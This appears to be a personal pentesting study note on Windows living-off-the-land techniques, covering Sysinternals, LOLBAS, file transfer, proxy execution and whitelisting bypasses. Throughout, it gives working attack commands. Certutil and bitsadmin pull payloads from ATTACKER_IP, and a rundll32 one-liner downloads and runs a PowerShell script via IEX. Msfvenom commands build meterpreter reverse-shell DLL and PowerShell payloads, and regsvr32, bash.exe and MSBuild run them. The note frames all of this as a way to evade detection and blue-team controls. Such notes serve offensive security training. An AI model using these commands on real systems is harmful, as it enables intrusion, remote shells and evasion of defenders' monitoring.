# Windows Sysinternals
Windows Sysinternals is a set of tools and advanced system utilities developed to help IT manage, troubleshoot and diagnose the Window OS. To use this tools, we need to accept the Microsoft license agreement of these tools, we can do so by passing the `accepteula` argument at the command prompt or by GUI during tool execution.
The following are some popular Windows Sysinternals tools:

| [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)   | Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services. |
| -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)         | A tool that executes programs on a remote system.                                                                               |
| [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | An advanced Active Directory tool that helps to easily view and manage the AD database.                                         |
| [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)     | Monitors running processes for CPU spikes and the ability to dump memory for further analysis.                                  |
| [ProcMon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)       | An essential tool for process monitoring.                                                                                       |
| [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview)       | A tool that lists all TCP and UDP connections.                                                                                  |
| [PsTools](https://docs.microsoft.com/en-us/sysinternals/downloads/pstools)       | The first tool designed in the Sysinternals suite to help list detailed information.                                            |
| [Portmon](https://docs.microsoft.com/en-us/sysinternals/downloads/portmon)       | Monitors and displays all serial and parallel port activity on a system.                                                        |
| [Whois](https://docs.microsoft.com/en-us/sysinternals/downloads/whois)           | Provides information for a specified domain name or IP address.                                                                 |
## Sysinternals Live
One of the great features of Windows Sysinternals is that there is no installation required. Microsoft provides a Windows Sysinternals service, Sysinternals live, with various ways to use and execute the tools. We can access and use them through:
- Web browser ([link](https://live.sysinternals.com/))
- Windows Share
- Command prompt
In order to use these tools, we either download them or enter the Sysinternal Live path `//live.sysinternals.com/tools` into Windows Explorer.

## Utilization
Built-in tools are helpful for system administrators, as well as for hackers/pentesters due to the inherit trust they have within the operating system. This trust is beneficial to us, who do not want to get detected or caught by any security control on our target. Therefore these tools are fundamental to evade detection and other blue team controls.
Now of course this is common knowledge so there are many ways to implement defensive controls against them, but still worth to know.

# LOLBAS
Standing for **Living Off the Land Binaries And Scripts**, [LOLBAS](https://lolbas-project.github.io) is a project which primary goal is to gather and document Microsoft-signed and built-in tools used as LOL techniques, including binaries, scripts, and libraries.
![[Pasted image 20240919230851.png]]
## Criteria
Specific criteria is required for a tool to be a LOL technique and accepted as part of the LOLBAS project:
- Microsoft-signed file native to the OS or downloaded from Microsoft.
- Having additional interesting unintended functionality not covered by known use cases.
- Benefits an APT or Red Team engagement.

# File Operations
techniques that aim to be used in file operation, including download, upload and encoding.
## Certutil
Certutil is an utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components. However, the technique known as the **Ingress tool transfer**, allows us to transfer and encode files.
We for example could use it to download a file from an attacker's web server and store it in a temporary folder.
```cmd
certutil -URLcache -split -f http://ATTACKER_IP/payload.exe payload.exe
```
note that we use `-urlcache` to enable the URL option to use in the command `-split -f` to split and force fetching files from the provided URL.

We could also use it as an encoding tool where we can base64 encode files and decode the content of files.
```cmd
certutil -encode payload.exe Encoded-payload.txt
```

## BITSAdmin
The `bitsadmin` tool is a system administrator utility that can be used to create, download or upload **Background Intelligent Transfer Service** (BITS) jobs and check their progress. BITS is a low bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers.
We can abuse the BITS jobs to download and execute a payload in a compromised machine.
```powershell
bitsadmin.exe /transfer /download /priority Foreground http://ATACKER_IP/payload.exe c:\Users\myuser\Desktop\payload.exe
```
`/transfer` to use the transfer option.
`/download` to specify a transfer using the download type.
`/priority` we are setting the priority of the job to be running in the foreground.
Note that we need to specify the complete path of the output for it to work.

## FindStr
Findstr is a built-in tools used to find text and string patterns in files. It helps users search within files or parsed output. However, we can use it to download remote files from SMB shared folders within the network as follows:
```powershell
findstr /V dummystring \\MACHINENAME\SHAREFOLDER\test.exe > c:\Windows\Temp\test.exe
```
`\V` to print out the lines that don't contain the string provided.
`dummystring` the text to be searched for, in this case, we provide a string that must not be found in a file
`> c:\...` redirect output to a file on the machine.

# File Execution
The typical case of executing a binary involves various known methods such as using the command line `cmd.exe` or from the desktop. However, other ways exist to achieve payload execution by abusing other system binaries, of which one of the reasons is to hide or harden the payload's process. Thus the technique **Signed Binary Proxy Execution** or **Indirect Command Execution**, where we leverage other system tools to spawn payloads. Also may aid in [[AV Evasion Shellcode|evasion]].

## File Explorer
A file manager and system component for Windows. We can use this binary to execute other `.exe` files.
We can get the binary from
- `C:\Windows\explorer.exe` for the Windows 64-bit version
- `C:\Windows\SysWOW64\explorer.exe` for the 32-bit version
In order to create a child process of explorer, we can execute the following
```powershell
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

## WMIC
**Windows Management Instrumentation** (WMIC) is a Windows CLI utility that manages Windows components. It can also be used to execute binaries for evading defensive measures. Referring to the Signed Binary Proxy Execution technique.
```powershell
wmic.exe process call create calc
```
We simply create a new process of a binary of our choice, in this case `calc.exe`

## Rundll32
Rundll32 is a built-in tool that loads and runs DLL files from within the OS. We can abuse this to run arbitrary payloads and execute JavaScript and PS scripts.
Located at:
- `C:\Windows\System32\rundll32.exe` for the Windows 64-bit version
- `C:\Windows\SysWOW64\rundll32.exe` for the 32-bit version
We can try to execute a binary using
```
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```
We used `runndll32.exe` that embeds a JavaScript component, `eval()`, to execute the calc binary.
As mentioned we could also use a PowerShell script. The following runs a JavaScript that executes a PS command to download from a remote website and run a script.
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1');");
```

# Application Whitelisting Bypasses
Application Whitelisting is an endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Application whitelisting is rule-based, where it specifies list of approved applications or executable files that are allowed to be present and executed on an OS.

## Regsvr32
Regsvr32 is a CLI tool to register and unregister DLLs in the Windows Registry. Located at:
- `C:\Windows\System32\regsvr32.exe` for the Windows 32 bits version
- `C:\Windows\SysWOW64\regsvr32.exe` for the Windows 64 bits version
It can also be used to execute binaries and bypass the Application Whitelisting. Using trusted OS components it executes binaries in memory, which is one of the reasons it can bypass whitelisting.

---

First we need to create a malicious DLL, we can use msfvenom 
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 -o LOL.dll
```
Now, once we have the DLL on the target machine, we can execute it using
```powershell
regsvr32.exe LOL.dll

regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads/LOL.dll
```
With the second option we can instruct regsvr32 to:
- `/s` run in silent mode (no messages)
- `/n` not call the DLL register server
- `/i` to use another server since we used `/n`
- `/u` to run with unregister method

## Bourne Again Shell
In 2016, Microsoft added support for the Linux environment on Windows 10,11 and server 2019. This feature is known as **Windows Subsystem for Linux** (WSL), and it exists in two WSL versions: WSL1 and WSL2. WSL is a Hyper-V virtualized linux distribution that runs on the OS. This feature is an addon that a user can install and interact with a Linux distribution. As part of WSL, `bash.exe` is a Microsoft tool for interacting with the Linux environment.

---

We can use this to execute payloads and bypass whitelisting since it is a Microsoft signed binary. By executing
```powershell
bash.exe -c "path\to\payload"
```
We can execute any unsigned payload. Note that we need to enable and install the WSL if not already installed.

# Powerless
Powershell is one of the most used languages for malicious activities, therefore, some organizations have started to  monitor or block `powershell.exe` from being executed. As a result [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell/tree/master) was born, it is a python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. It relies on abusing the MSBuild, a platform for building Windows Applications, to execute remote code.

We can use it as follows, first we can generate a simple `ps1` payload with msfvenom
```sh
msfvenom -p windows/meterpreter/reverse-winhttps lhost=tun0 lport=4443 -f psh-relfection -o liv0ff.ps1
```
Then we can convert the payload to be compatible with the MSBuild tool. 
```sh
python2 PowerLessShell.py -type powershell -source liv-off.ps1 -output liv0ff.csproj
```
Then we get the file to the target machine, and once there we use `MSBuild.exe` to build our project and execute it, running our payload and getting us a connection